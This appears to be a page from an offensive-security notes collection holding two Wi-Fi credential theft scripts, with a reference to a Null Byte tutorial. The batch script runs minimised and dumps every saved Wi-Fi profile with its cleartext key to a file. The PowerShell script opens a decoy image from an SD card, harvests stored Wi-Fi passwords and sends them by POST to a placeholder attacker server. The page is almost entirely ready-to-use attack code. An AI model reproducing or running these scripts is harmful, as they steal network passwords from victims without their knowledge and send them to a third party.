# Wi-Fi

## Scripting

### Batch

```batch
@echo off
rem minimize the window
if not "%1"=="min" start "" /min "%~f0" min & exit

setlocal enabledelayedexpansion

rem set the output file location
set "output_file=%CD%\wireless_credentials.txt"

rem create or clear the output file
> "%output_file%" (
    rem add a marker for when the dump will start
    echo ===== Wi-Fi dump (%date% %time%) =====
)

rem PowerShell gets all profile names (handles spaces / locale)
for /f "usebackq delims=" %%P in (`powershell.exe -NoProfile -Command "(netsh.exe wlan show profiles) -match ':' | ForEach-Object { ($_.Split(':',2)[1].Trim()) }"`) do (
  echo [%%P] >> "%output_file%"
  netsh.exe wlan show profile name="%%~P" key=clear >> "%output_file%" 2>&1
  echo . >> "%output_file%"
)

echo .
echo Wi-Fi details have been appended to:
echo %output_file%
endlocal
```

### PowerShell

```powershell
Add-Type -AssemblyName System.Web

# Define the URL of the remote server
$yourVPS = "https://YOUR-VPS-IP-HERE/index.php"

# Define the name of the SD card volume
$removable_media = (gwmi win32_volume -f 'label=''SD-CARD-NAME-HERE''').Name

# Open the image file on the SD card
Invoke-Item -Path ("$removable_media" + "REAL-IMAGE-NAME-HERE.png")

# Iterate through all XML files in the Wlansvc\Profiles directory and its subdirectories
ForEach ($path in [System.IO.Directory]::EnumerateFiles("C:\ProgramData\Microsoft\Wlansvc\Profiles", "*.xml", "AllDirectories")) {
    try {
        # Create a new XML document object
        $oXml = New-Object System.XML.XMLDocument

        $oXml.Load($path)

        # Extract the SSID from the XML file
        $ssid = $oXml.WLANProfile.SSIDConfig.SSID.name

        # Use netsh.exe to get the Wi-Fi profile information
        $netinfo = netsh.exe wlan show profiles name="$ssid" key=clear

        # Extract the password from the profile information
        $pass = (($netinfo | Select-String -Pattern "Key Content") -split ":")[1].Trim()

        # Append the SSID and password to the send data string
        $sendData += "SSID: " + ($ssid) + "`n" + "PASSWORD: " + ($pass) + "`n`n"
    } catch {}
}

# Send the collected data to the remote server
Invoke-WebRequest -Uri $yourVPS -Method 'POST' -Body $sendData
```

---
## References

### Null Byte

- [Null Byte: How to Hack Anyone's Wi-Fi Password Using a Birthday Card, Part 1 (Creating the Payload)](https://null-byte.wonderhowto.com/how-to/hack-anyones-wi-fi-password-using-birthday-card-part-1-creating-payload-0183043)